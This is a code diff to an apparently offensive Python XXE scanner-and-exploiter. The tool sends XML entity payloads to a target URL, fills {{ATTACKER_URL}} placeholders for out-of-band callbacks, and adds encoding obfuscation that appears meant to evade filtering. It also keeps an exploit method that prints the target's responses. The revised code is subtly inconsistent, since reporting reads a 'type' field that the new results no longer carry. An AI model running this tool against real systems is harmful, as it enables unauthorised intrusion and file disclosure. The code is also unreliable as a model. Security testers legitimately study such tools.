@@ -4,34 +4,31 @@ import base64
 import requests
 import logging
 import concurrent.futures
+import time 
 from pathlib import Path
 from requests.exceptions import RequestException
-from payloads.payloads import Payloads  # Updated import path
+from payloads.payloads import Payloads 
 
 logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
 class XXEDetector:
-    def __init__(self, target_url):
+    def __init__(self, target_url, delay=2):
         self.target_url = target_url
         self.payloads = Payloads('payloads/payloads.json').get_payloads()
         self.vulnerabilities = []
+        self.obfuscation_methods = ['base64', 'unicode', 'decimal', 'octal', 'hex', 'dword']
+        self.delay = delay 
 
     def send_request(self, payload):
         headers = {'Content-Type': 'application/xml'}
         try:
-            response = requests.post(self.target_url, data=f'<data>{payload}</data>', headers=headers)
+            response = requests.post(self.target_url, data=f'<data>{payload}</data>', headers=headers, timeout=10)
             return response.text
         except RequestException as e:
             logging.error(f"[!] Failed to send request: {e}")
             return None
 
     def is_xxe_detected(self, response):
-        try:
-            response = self.decode_response(response)
-        except Exception as e:
-            logging.error(f"[!] Error decoding response: {e}")
-            return False
-
         xxe_patterns = [
             r'<!DOCTYPE\s+[^>]*[\[><]+',
             r'\bENTITY\b',
@@ -39,52 +36,54 @@ class XXEDetector:
             r'XML\s+parsing\s+error',
             r'Entity\s+.+?\s+not\s+defined',
         ]
-
         for pattern in xxe_patterns:
             if re.search(pattern, response, re.IGNORECASE):
-                logging.debug("[+] XXE detected using pattern: {}".format(pattern))
+                logging.debug(f"[+] XXE detected using pattern: {pattern}")
                 return True
         return False
 
-    def decode_response(self, response):
-        try:
-            response = urllib.parse.unquote(response)
-            response = base64.b64decode(response).decode('utf-8', errors='ignore')
-        except Exception as e:
-            raise Exception(f"[!] Error decoding response: {e}")
+    def replace_placeholders(self, payload, attacker_url):
+        return payload.replace("{{ATTACKER_URL}}", attacker_url).replace("{{TARGET_URL}}", self.target_url)
 
-        return response
-
-    def send_and_detect(self, payload):
+    def send_and_detect(self, payload, attacker_url):
+        payload = self.replace_placeholders(payload, attacker_url)
         response = self.send_request(payload)
         if response and self.is_xxe_detected(response):
             return {'payload': payload, 'response': response}
         return None
 
     def detect_xxe_vulnerabilities(self, attacker_url):
-        logging.info("[*] Starting XXE vulnerability detection using concurrent execution...")
-        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-            results = list(executor.map(self.send_and_detect, [payload.replace("{{TARGET_URL}}", self.target_url).replace("{{ATTACKER_URL}}", attacker_url) for _, payloads in self.payloads.items() for payload in payloads]))
+        logging.info("[*] Starting XXE vulnerability detection...")
 
-        for result in results:
+        all_payloads = []
+        for _, payloads in self.payloads.items():
+            for payload in payloads:
+                all_payloads.append(payload)
+
+                obfuscated_payloads = Payloads('').apply_obfuscation(payload, self.obfuscation_methods)
+                all_payloads.extend(obfuscated_payloads)
+
+        detected_vulnerabilities = []
+        for payload in all_payloads:
+            result = self.send_and_detect(payload, attacker_url)
             if result:
                 logging.info(f"[+] Vulnerability detected with payload: {result['payload']}")
-                self.vulnerabilities.append({'type': 'Detected', 'payload': result['payload'], 'response': result['response']})
+                detected_vulnerabilities.append(result)
 
+            time.sleep(self.delay)
+
+        self.vulnerabilities = detected_vulnerabilities
         return self.vulnerabilities
 
     def exploit_xxe(self, payload):
         logging.info(f"[*] Attempting to exploit with payload: {payload}")
         response = self.send_request(payload)
+
+        time.sleep(self.delay)
+
         print("[*] Exploitation Result:")
         print(response)
         print("=" * 50)
-
-    def exploit_detected_vulnerabilities(self):
-        if self.vulnerabilities:
-            logging.info("[+] Exploiting detected XXE vulnerabilities:")
-            for vulnerability in self.vulnerabilities:
-                self.exploit_xxe(vulnerability['payload'])
 
     def report_vulnerabilities(self):
         if self.vulnerabilities:
@@ -94,18 +93,17 @@ class XXEDetector:
                 report_entry = f"Type: {vulnerability['type']}, Payload: {vulnerability['payload']}\n"
                 print(report_entry)
                 report_content += report_entry
-            
-            self.save_report(report_content)
 
+            self.save_report(report_content)
         else:
             print("[!] No XXE vulnerabilities detected.")
 
     def save_report(self, report_data, filename="XXE_Report.txt"):
         home = Path.home()
-        report_path = home / 'Downloads' / filename 
+        report_path = home / 'Downloads' / filename
         if not report_path.parent.exists():
-            report_path = home / filename 
-        
+            report_path = home / filename
+
         with report_path.open('w', encoding='utf-8') as report_file:
             report_file.write(report_data)
         print(f"[**] Report saved to: {report_path}")
